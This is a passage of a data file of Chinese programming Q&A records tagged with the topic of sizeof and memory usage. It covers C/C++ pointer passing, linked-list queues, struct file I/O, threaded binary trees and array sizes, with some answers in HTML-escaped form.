\"<<author<<setw(18)<<\"单价: \"<<price<<setw(10) <<(onshelf==1? \"有现存\":\"已借完\") <<endl; \n} \n};  \nclass BDatabase \n{ \n\nprivate: \nint top;\nBook book[Maxb]; \npublic: \nBDatabase() \n{ \nBook b; \ntop=-1; \nfstream file(\"book.txt\",ios::in); \nwhile (1) \n{ \nfile.read((char *)&b,sizeof(b)); \nif (!file) break; \ntop++; \nbook[top]=b; \n} \nfile.close(); \n} \nvoid clear() \n{ \ntop=-1; \n} \nint addbook(int n,char *na,char*au,int pr,char *bp) \n{ \nBook *p=query(n); \nif (NULL==p) \n{ \ntop++; \nbook[top].addbook(n,na,au,pr,bp); \nreturn 1; \n} \nreturn 0; \n} \nBook *query(int bookid) \n{ \nfor (int i=0;i<=top;i++) \nif (book[i].getNo()==bookid &&book[i].gettag()==0) \n{ \nreturn &book[i]; \n} \nreturn NULL; \n} \nvoid bookdata(); \nvoid disp() \n{ \nfor (int i=0;i<=top;i++) \nif (book[i].gettag()==0) \nbook[i].disp(); \n} \n~BDatabase() \n{ \nfstream file(\"book.txt\",ios::out); \nfor (int i=0;i<=top;i++) \nif (book[i].gettag()==0) \nfile.write((char *)&book[i],sizeof(book[i])); \nfile.close(); \n} \n}; \nvoid BDatabase::bookdata() \n{ \nchar choice; \nchar bauthor[10];\nint bprice; \nchar bname[40]; \nint bookid; \nchar bplace[40];\nBook *b; \n\n\n\ncout <<\"\\n\\n\\n\\t\\t\\t图书信息\"<<endl<<endl; cout<<\"\\t\\t1 增加图书信息\\n \\t\\t2 修改图书信息\\n\\t\\t3 删除图书信息\\n\\t\\t4 查询图书信息\\n\\t\\t0 退出\"<<endl; \ncin >> choice; \nswitch (choice) \n{ \ncase '1': \ncout << \"输入图书检索号:\"<<endl; \ncin >> bookid; \ncout << \"输入图书书名:\"<<endl; \ncin >> bname; \ncout<<\" 输入作者名:\"; \ncin>>bauthor;\ncout << \"输入图书价格:\"<<endl; \ncin >> bprice; \ncout << \"输入图书出版社:\"<<endl; \ncin >> bplace; \naddbook(bookid,bname,bauthor,bprice,bplace); \nbreak;\ncase '2': \ncout << \"输入图书检索号:\"<<endl; \ncin >> bookid; \nb=query(bookid); \nif (b==NULL) \n{ \ncout << \" 信息错误\"<<endl; \nbreak; \n} \ncout << \"重新输入书名:\"<<endl; \ncin >> bname; \nb->setname(bname); \nbreak; \ncase '3': \ncout <<\" 读入图书检索号:\"<<endl; \ncin >> bookid; \nb=query(bookid); \nif (b==NULL) \n{ \ncout <<\" 信息错误\" << endl; \nbreak; \n} \nb->delbook(); \nbreak; \ncase '4': \ncout << \" 读入图书检索号:\"<<endl; \ncin >> bookid; \nb=query(bookid); \nif (b==NULL) \n{ \ncout <<\" 信息错误\"<< endl; \nbreak; \n} \nb->disp(); \nbreak; \n\ndefault:cout<<\"信息错误，请重新输入:\"; \n} \n} \n\nvoid main()\n{ \nchar choice; \nint bookid,readerid; \nRDatabase ReaderDB; \nReader *r; \nBDatabase BookDB; \nBook *b; \n\n\n\ncout <<endl<<endl<<\"\\t\\t\\t 图书管理系统\\n\\n\\n\"; \n\ncout <<\"\\t\\t\\t1 借还情况\\n\\n\\t\\t\\t2 图书信息表\\n\\n\\t\\t\\t3 借阅者信息表\\n\\n\\t\\t\\t0 退出\"<<endl; \ncin >> choice; \nswitch (choice) \n{ \ncase '1': \ncout <<\"\\t\\t\\t1 借书\\n\\n\\t\\t\\t2 还书\\n\\n\\t\\t\\t0 退出\"<<endl;\ncin>>choice;\nswitch(choice)\n{\n\ncase '1':\ncout <<\" 借阅者学号:\"; \ncin >>readerid; \ncout <<\" 图书检索号：\"; \ncin >>bookid; \nr=ReaderDB.query(readerid); \nif (NULL==r) \n{ \ncout <<\" 借阅者信息错误，不能借书\"<< endl; \nbreak; \n} \nb=BookDB.query(bookid); \nif (b==NULL) \n{ \n\n    cout<<\"图书信息错误，不能借书\"<<endl;\n    break;\n}\nif(b->borrowbook()==0)\n{\n    cout<<\"该图书没有现存，不能借书\"<<endl;\n    break;\n}\nr->borrowbook(b->getNo());\nbreak;\ncase '2':\n    cout<<\"借阅者学号:\";\n    cin>>readerid;\n    cout<<\"图书检索号：\";\n    cin>>bookid;\n    r=ReaderDB.query(readerid);\n    if(r==NULL)\n    {\n        cout<<\"借阅者信息错误，不能还书\"<<endl;\n        break;\n    }\n    b=BookDB.query(bookid);\n    if(b==NULL)\n    {\n        cout<<\"图书信息错误，不能还书\"<<endl;\n        break;\n    }\n    b->retbook();\n    r->retbook(b->getNo());\n    break;\n}\n\n\n\ncase '2':\n    BookDB.bookdata();\nbreak; \ncase '3': \nReaderDB.readerdata(); \nbreak; \ndefault:cout<<\"信息错误，请从新输入：\"; \n} \n}\n\n"]], "Tag": "程序设计"}
{"Answer": "因为 你传的是一个 形参变量 还记得 交换两个数的经典代码么， 为什么 只传 变量不可以修改值 原因是一样的！但是第二段程序不可以，原因是rear和front总是相同的，所以输出的都是-1。我检查了一下，发现每一次rear改变会是的front同时改变。这是为什么？你说的这几句话，其实指针的值是不会变得，和交换两个数的原理是一样的，其实修改很简单，可以直接用引用我贴下我的代码！\r\n\r\n#include&lt;stdio.h&gt;\r\n#include&lt;stdlib.h&gt;\r\n\r\ntypedef struct Node\r\n{\r\n\tint data;\r\n\tstruct Node *next;\r\n}Node;\r\n\r\nvoid push(Node* &amp;rear, int e)\r\n{\r\n\tNode *node = (Node*)malloc(sizeof(Node));       //分配空间\r\n\tnode-&gt;data = e;     //数据域\r\n\tnode-&gt;next = NULL;  //指针域\r\n\trear-&gt;next = node;  //添加到末尾\r\n\trear = node;        //更新尾指针\r\n}\r\n\r\nint pop(Node* &amp;rear, Node* front)\r\n{\r\n\tif (front == rear)\r\n\t\treturn -1;\r\n\tNode *t = front-&gt;next;      //获取队首元素\r\n\tint e = t-&gt;data;        //获取队首数据域\r\n\tfront-&gt;next = t-&gt;next;      //更新队首指针\r\n\tif (t == front) //如果队首与队尾相同,则将队尾指针指向队首\r\n\t\trear = front;\r\n\tfree(t);        //释放\r\n\treturn e;       //返回队首数据域\r\n}\r\n\r\n\r\nint main()\r\n{\r\n\tNode *rear = (Node*)malloc(sizeof(Node));\r\n\tNode *front = rear;\r\n\tpush(rear, 1);\r\n\tpush(rear, 2);\r\n\tpush(rear, 3);\r\n\tint k = pop(rear, front);\r\n\tprintf(\"%d\\n\", k);\r\n\tk = pop(rear, front);\r\n\tprintf(\"%d\\n\", k);\r\n\tk = pop(rear, front);\r\n\tprintf(\"%d\\n\", k);\r\n\treturn 0;\r\n}\r\n\r\n```\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言指针内存分配相关问题，求大神指导。。。", ["这里有两段程序，基本上是一样的。都是使用链表来实现队列。这里实现了出队和入队操作。第一段程序能够正确执行，但是第二段程序不可以，原因是rear和front总是相同的，所以输出的都是-1。我检查了一下，发现每一次rear改变会是的front同时改变。这是为什么？第一段程序通过一个结构体传递rear和front确可以，这是为什么？是通过结构体构建了二级指针吗？求大牛。。。我都快绕晕了，好几次遇到这个问题了。。。", "\n\n", "能够正确执行的程序：", "\n\n", " #include<stdio.h>\n#include<stdlib.h>\n\ntypedef struct Node\n{\n        int data;\n        struct Node *next;\n}Node;\n\ntypedef struct Q\n{\n        Node *front;\n        Node *rear;\n}Q;\n\nvoid push(Q*q, int e)\n{\n        Node *node = (Node*)malloc(sizeof(Node));       //分配空间\n        node->data = e;     //数据域\n        node->next = NULL;  //指针域\n        q->rear->next = node;   //添加到末尾\n        q->rear = node;     //更新尾指针\n}\n\nint pop(Q* q)\n{\n        if (q->front == q->rear)\n            return -1;\n        Node *t = q->front->next;       //获取队首元素\n        int e = t->data;        //获取队首数据域\n        q->front->next = t->next;       //更新队首指针\n        if (t == q->front)  //如果队首与队尾相同,则将队尾指针指向队首\n            q->rear = q->front;\n        free(t);        //释放\n        return e;       //返回队首数据域\n}\n\n\nint main()\n{\n        Q queue;\n        queue.rear = (Node*)malloc(sizeof(Node));\n        queue.front = queue.rear;\n        push(&queue, 1);\n        push(&queue, 2);\n        push(&queue, 3);\n        int k = pop(&queue);\n        printf(\"%d\\n\", k);\n        k = pop(&queue);\n        printf(\"%d\\n\", k);\n        k = pop(&queue);\n        printf(\"%d\\n\", k);\n        return 0;\n}\n", "\n\n", "不能够正确执行的：", "\n\n", "#include<stdio.h>\n#include<stdlib.h>\n\ntypedef struct Node\n{\n        int data;\n        struct Node *next;\n}Node;\n\nvoid push(Node* rear, int e)\n{\n        Node *node = (Node*)malloc(sizeof(Node));       //分配空间\n        node->data = e;     //数据域\n        node->next = NULL;  //指针域\n        rear->next = node;  //添加到末尾\n        rear = node;        //更新尾指针\n}\n\nint pop(Node* rear, Node* front)\n{\n        if (front == rear)\n            return -1;\n        Node *t = front->next;      //获取队首元素\n        int e = t->data;        //获取队首数据域\n        front->next = t->next;      //更新队首指针\n        if (t == front) //如果队首与队尾相同,则将队尾指针指向队首\n            rear = front;\n        free(t);        //释放\n        return e;       //返回队首数据域\n}\n\n\nint main()\n{\n    Node *rear = (Node*)malloc(sizeof(Node));\n        Node *front = rear;\n        push(rear, 1);\n        push(rear, 2);\n        push(rear, 3);\n        int k = pop(rear,front);\n        printf(\"%d\\n\", k);\n        k = pop(rear, front);\n        printf(\"%d\\n\", k);\n        k = pop(rear, front);\n        printf(\"%d\\n\", k);\n        return 0;\n}\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;使用vs2013运行你的代码没通过编译&amp;#xff0c;将cout &amp;lt;&amp;lt; STU2[i].name &amp;lt;&amp;lt; &amp;#34;\\t&amp;#34;;改为cout &amp;lt;&amp;lt; STU2[i].name.c_str() &amp;lt;&amp;lt; &amp;#34;\\t&amp;#34;;之后通过编译&amp;#xff0c;并未发生你说的错误&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++在程序结束时内存访问冲突", ["\n", "#include<iostream>\n#include<fstream>\nusing namespace std;\nstruct stu\n{\n    string name;\n    int num;\n    int score[3];\n};\n\nint main()\n{\n    int n = 5;\n    ofstream fout(\"test9_1cout.txt\");\n    stu Stu[5] = { {\"张明明\",101,{67,78,82}},\n        {\"李天天\",102,{78,91,88}},\n        {\"张好好\",103,{68,82,56}},\n        {\"王酷\",104,{56,45,77}},\n        {\"陈跑\",105,{67,38,47}}\n    };\n    stu STU2[5] = {};\n    fout.write((char*)Stu, sizeof(Stu));\n    fout.close();\n\n    ifstream fin(\"test9_1cout.txt\");\n    fin.read((char*)(STU2), sizeof(STU2));\n\n\n    for (int i = 0; i < 5; i++)\n    {\n        cout << STU2[i].name << \"\\t\";\n        cout << STU2[i].num << \"\\t\";\n        for (int j = 0; j < 3; j++)\n        {\n            cout << STU2[i].score[j] << \"\\t\";\n        }\n    }\n    fin.close();\n    return 0;\n}\n", "\n\n", "运行到", "都没问题，再往下", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;值为9&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/380579219166145.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["不懂这个sizeof('’20220607\")的值是", ["sizeof('’20220607\")的值是多少 ffgcgvvrvcrfcrcrcffvvhfrcghyfdcgjklhghklk"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;回答的朋友&amp;#xff0c;还是要负责一点的哦&amp;#xff01;&amp;#xff01;&amp;#xff01;&lt;br /&gt;sizeof 的参数是argv[i]&amp;#xff0c;这个argv[i] 是什么&amp;#xff1f;是字符串指针&amp;#xff0c;指针。。。指针。。。指针。。。。&lt;br /&gt;就是你写的是char、short&amp;#xff0c;得到的依然是8 个字节。。。因为你是64位的系统&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof 操作的传入参数问题？", ["今天在写一个测试int long代码时 遇到了一个问题", "当我键入 $ ./a.out int long 时 得到 int-8 long-8", "而不是 int-4 long-8", "为什么？", "\n", "int", " ", "main", "(", "int", " argc,", "char", " * argv[])", "{\n\n  ", "for", " (", "int", " i=", "1", ";i<argc;i++){\n    ", "printf", "(", "\"%s-%lu\\t\"", ",argv[i],", "sizeof", "(argv[i] ));\n  }\n  ", "return", " ", "0", ";\n}\n\n", "\n", "该怎么改呢？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组名作为参数传递给函数时&amp;#xff0c;数组名会自动退化成指针&amp;#xff0c;从而数组大小信息丢失&amp;#xff0c;你需要额外一个参数来传递数组大小。&lt;br /&gt;你的printArr函数需要改为&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printArr&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; arr[], &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; size)&lt;/span&gt;&lt;/span&gt;{ &lt;span class=\"hljs-comment\"&gt;// 这里arr是int*类型的指针&amp;#xff0c;sizeof(arr)返回的是int*指针的大小&amp;#xff0c;而不是数组的大小&lt;/span&gt;\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; size; i&amp;#43;&amp;#43;){\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(arr[i]){\n            &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\t&amp;#34;&lt;/span&gt;, i);\n        }\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;参考&lt;br /&gt;&lt;a href=\"https://en.cppreference.com/w/c/language/array#Array_to_pointer_conversion\" id=\"textarea_1663742601720_1663742707685_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/c/language/array#Array_to_pointer_conversion&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C语言中sizeof操作符表达数组长度的问题。", ["写了一个printArr函数用来遍历数组，其中数组长度使用了", "sizeof(arr) / sizeof(arr[0])", "表示，但是在main函数中调用后只能print数组中的前两个元素，同时会报 [Warning] 'sizeof' on array function parameter 'arr' will return size of 'int *' [-Wsizeof-array-argument]", "\n", "直接写进main函数，不采取调用的方式则正确打印。", "\n", "\n", "#", "include", " ", "<stdio.h>", "\n", "int", " ", "printArr", "(", "int", " primeLib[])", ";\n\n", "int", " ", "main", "()", "{\n    ", "int", " primeLib[", "25", "];\n    ", "for", "(", "int", " i = ", "0", "; i < ", "25", "; i++){\n        primeLib[i] = ", "1", ";\n    }\n    ", "for", "(", "int", " i = ", "1", "; i  < ", "25", ";i++){\n        ", "if", "(primeLib[i]){\n            ", "for", "(", "int", " j = ", "2", "; j * (i + ", "1", ") < ", "25", "; j++){        \n            primeLib[j * (i + ", "1", ")] = ", "0", ";\n            }\n        }\n    }\n    ", "printArr", "(primeLib);\n    ", "return", " ", "0", ";\n}\n\n", "int", " ", "printArr", "(", "int", " arr[])", "{\n        ", "for", "(", "int", " i = ", "0", "; i < ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]); i++){\n        ", "if", "(arr[i]){\n            ", "printf", "(", "\"%d\\t\"", ", i);\n        }\n    }\n    ", "return", " ", "0", ";\n}\n\n", "\n", "运行结果及报错内容", "\n", "\n", "\n", "正常输出结果如下：", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n&lt;span class=\"hljs-comment\"&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#include&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;\ntypedef char TElemType;\ntypedef struct BiNode{\n    struct BiNode *lchild,*rchild;\n    int ltag,rtag;\n    TElemType date;\n}BiNode,*BiTree;\nint InitBiTree(BiTree *t)\n{\n    (*t)&amp;#61;(BiNode*)malloc(sizeof(BiNode));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(!(*t)) &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;lchild&amp;#61;NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rchild&amp;#61;NULL;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;date&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#39;\\0&amp;#39;&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;ltag&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rtag&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\nint CreatBiTree(BiTree *t)\n{\n    TElemType ch;\n    scanf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;,&amp;amp;ch);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(ch!&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#39;#&amp;#39;&lt;/span&gt;){\n        (*t)&amp;#61;(BiNode*)malloc(sizeof(BiNode));\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;date&amp;#61;ch;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;ltag&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rtag&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n        CreatBiTree&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(&amp;amp;(*t)-&amp;gt;lchild)&lt;/span&gt;;\n        &lt;span class=\"hljs-title\"&gt;CreatBiTree&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&amp;amp;(*t)-&amp;gt;rchild)&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-title\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;&amp;#61;&lt;span class=\"hljs-title\"&gt;NULL&lt;/span&gt;;\n}\n&lt;span class=\"hljs-title\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;InOrderTraverse&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(BiTree *t,BiTree *pre)&lt;/span&gt;\n{\n    &lt;span class=\"hljs-title\"&gt;if&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;((*t))&lt;/span&gt;{\n        &lt;span class=\"hljs-title\"&gt;InOrderTraverse&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&amp;amp;(*t)-&amp;gt;lchild,&amp;amp;(*pre))&lt;/span&gt;;\n        &lt;span class=\"hljs-title\"&gt;if&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;((*t)-&amp;gt;lchild&amp;#61;&amp;#61;NULL)&lt;/span&gt;{\n            &lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;ltag&amp;#61;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t)&lt;/span&gt;-&amp;gt;&lt;/span&gt;lchild&amp;#61;*pre;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;((*pre)-&amp;gt;rchild&amp;#61;&amp;#61;NULL)&lt;/span&gt;{\n            &lt;span class=\"hljs-params\"&gt;(*pre)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rtag&amp;#61;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n            &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*pre)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rchild&amp;#61;*t;\n        }\n        *pre&amp;#61;*t;\n        InOrderTraverse&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(&amp;amp;(*t)-&amp;gt;rchild,&amp;amp;(*pre))&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-title\"&gt;else&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;return&lt;/span&gt; ;\n} \n&lt;span class=\"hljs-title\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;In&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(BiTree *t1,BiTree *t,BiTree *pre)&lt;/span&gt; \n{\n    &lt;span class=\"hljs-params\"&gt;(*t1)&lt;/span&gt;-&amp;gt;&lt;/span&gt;ltag&amp;#61;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(!(*t))&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;(*t1)&lt;/span&gt;-&amp;gt;&lt;/span&gt;lchild&amp;#61;(*t1);\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;{\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*t1)&lt;/span&gt;-&amp;gt;&lt;/span&gt;lchild&amp;#61;(*t);\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*pre)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rtag&amp;#61;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n        &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-params\"&gt;(*pre)&lt;/span&gt;-&amp;gt;&lt;/span&gt;rchild&amp;#61;(*t1);\n    } \n}\nint Traverse(BiTree t)\n{\n    BiNode *p;\n    p&amp;#61;t-&amp;gt;lchild; \n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt;(p!&amp;#61;t){              &lt;span class=\"hljs-regexp\"&gt;//空树或遍历结束时&amp;#xff0c;p&amp;#61;&amp;#61;T\n        while(p-&amp;gt;ltag&amp;#61;&amp;#61;0)      //&lt;/span&gt;沿左孩子向下\n            p&amp;#61;p-&amp;gt;lchild;     &lt;span class=\"hljs-regexp\"&gt;//访问其左子树为空的结点\n        printf(&amp;#34;%c &amp;#34;,p-&amp;gt;date);\n        while(p-&amp;gt;rtag&amp;#61;&amp;#61;1&amp;amp;&amp;amp;p-&amp;gt;rchild!&amp;#61;t){\n            p&amp;#61;p-&amp;gt;rchild;    //&lt;/span&gt;沿右线索访问后继结点\n            printf(&lt;span class=\"hljs-string\"&gt;&amp;#34;%c &amp;#34;&lt;/span&gt;,p-&amp;gt;date);\n        }\n        p&amp;#61;p-&amp;gt;rchild;\n    }\n}\nint main()\n{\n    BiTree T1,T&amp;#61;NULL,Pre&amp;#61;NULL;\n    InitBiTree(&amp;amp;T1);\n    Pre&amp;#61;T1;\n    CreatBiTree(&amp;amp;T);\n    InOrderTraverse(&amp;amp;T,&amp;amp;Pre);&lt;span class=\"hljs-regexp\"&gt;//中序线索二叉树的建立 \n    In(&amp;amp;T1,&amp;amp;T,&amp;amp;Pre);//&lt;/span&gt;将首元节点加入 \n    Traverse(T1);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n} \n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["线索二叉树，问题出在哪里", ["\n", "#include<stdio.h>", "\n", "#include<stdlib.h>", "\ntypedef char TElemType;\ntypedef struct BiNode{\n    struct BiNode *lchild,*rchild;\n    int ltag,rtag;\n    TElemType date;\n}BiNode,*BiTree;\nint InitBiTree(BiTree *t)\n{\n    (*t)=(BiNode*)malloc(sizeof(BiNode));\n    ", "if", "(!(*t)) ", "return", " ", "0", ";\n    ", "(*t)", "->", "lchild=NULL;\n    ", "(*t)", "->", "rchild=NULL;\n    ", "(*t)", "->", "date=", "'\\0'", ";\n    ", "(*t)", "->", "ltag=", "0", ";\n    ", "(*t)", "->", "rtag=", "0", ";\n}\nint CreatBiTree(BiTree *t)\n{\n    TElemType ch;\n    scanf(", "\"%c\"", ",&ch);\n    ", "if", "(ch!=", "'#'", "){\n        (*t)=(BiNode*)malloc(sizeof(BiNode));\n        ", "(*t)", "->", "date=ch;\n        ", "(*t)", "->", "ltag=", "0", ";\n        ", "(*t)", "->", "rtag=", "0", ";\n        CreatBiTree", "(&(*t)->lchild)", ";\n        ", "CreatBiTree", "(&(*t)->rchild)", ";\n    }\n    ", "else", " ", "(*t)", "=", "NULL", ";\n}\n", "int", " ", "InOrderTraverse", "(BiTree *t,BiTree *pre)", "\n{\n    ", "if", "((*t))", "{\n        ", "InOrderTraverse", "(&(*t)->lchild,&(*pre))", ";\n        ", "if", "((*t)->lchild==NULL)", "{\n            ", "(*t)", "->", "ltag=", "1", ";\n            ", "(*t)", "->", "lchild=*pre;\n        }\n        ", "if", "((*pre)->rchild==NULL)", "{\n            ", "(*pre)", "->", "rtag=", "1", ";\n            ", "(*pre)", "->", "rchild=*t;\n        }\n        pre=t;\n        InOrderTraverse", "(&(*t)->rchild,&(*pre))", ";\n    }\n    ", "else", " ", "return", " ;\n} \n", "int", " ", "Traverse", "(BiTree t)", "\n{\n    ", "BiNode", " *", "p", ";\n    ", "p", "=", "t", "->", "lchild; \n    ", "while", "(p!=NULL){\n        printf(", "\"%c \"", ",p->date);\n        ", "if", "(p->rtag==", "1", ") p=p->rchild;\n        ", "if", "(p->ltag==", "0", ") p=p->lchild;\n    }\n}\nint main()\n{\n    BiTree T1,T=NULL,Pre=NULL;\n    InitBiTree(&T1);\n    Pre=T1;\n    T1->lchild=T;\n    CreatBiTree(&T);\n    InOrderTraverse(&T,&Pre);\n    Pre->rtag=", "1", ";\n    Pre->rchild=T1;\n    Traverse(T1);\n    ", "return", " ", "0", ";\n} \n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof 返回值是返回字节的大小&lt;br /&gt;sizeof date 返回值为40&lt;br /&gt;sizeof date【0】 返回值为4&lt;br /&gt;这样算出来表示这个数组里面有40/4&amp;#61;10个元素&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么这样可以计算数组大小（用sizeof）", []], "Tag": "程序设计"}
{"Answer": "结构体定义和InitQueue函数都是正确的。\r\n\r\n主函数需要修改：\r\n\r\n\r\n\r\n\r\n```\r\nint main()\r\n{\r\n\tQueue originOpen;\r\n\tPQueue Open = &amp;originOpen ;\r\n\tInitQueue(Open, 10);\r\n\t..............\r\n}\r\n```\r\n\r\n之前是\r\n\r\n\r\n\r\n```\r\n PQueue Open; //Open是指针变量\r\n```\r\n**指针变量定义后，变量值不确定，使用前必须先赋值。**\r\n\r\n这也算是C语言的基本原则之一。\r\n\r\n\r\n\r\n**用心回答每个问题，如果有帮助，请采纳答案好吗，谢谢~~~**", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["数据结构，关于内存初始化分配", ["在写循环队列时，经测试，在“Q->pBase=(int *)malloc(maxsize*sizeof(int));”该条语句执行时出错，以下为部分代码，请各位大大们救救小白..", "\n\n", " typedef struct queue\n{\n    int *pBase;\n    int front;    //指向队列第一个元素\n    int rear;    //指向队列最后一个元素的下一个元素\n    int maxsize; //循环队列的最大存储空间\n}Queue,*PQueue;\n\nvoid InitQueue(PQueue Q,int maxsize);       //初始化队列\nvoid QueueTraverse(PQueue Q);               //队列遍历\nint DestroyQueue(PQueue Q);                //摧毁队列Q\nint ClearQueue(PQueue Q);                  //清空队列Q\nint  QueueLength(PQueue Q);                 //返回队列Q的长度\nint GetHead(PQueue Q,int *e);              //返回队列Q的队头元素\nint QueueFull(PQueue Q);                   //判断队列是否为满\nint QueueEmpty(PQueue Q);                  //判断队列是否为空\nint Enqueue(PQueue Q, int e);              //插入元素e为Q的队尾元素\nint Dequeue(PQueue Q, int *e);             //删除Q的队头元素，并用e返回其值\nvoid InitQueue(PQueue Q,int maxsize)\n{\n    Q->pBase=(int *)malloc(maxsize*sizeof(int));\n    printf(\"malloc_OK\\n\");\n    if(NULL==Q->pBase)\n    {\n        printf(\"Memory allocation failure\");\n        exit(-1);        //退出程序\n    }\n    Q->front=0;         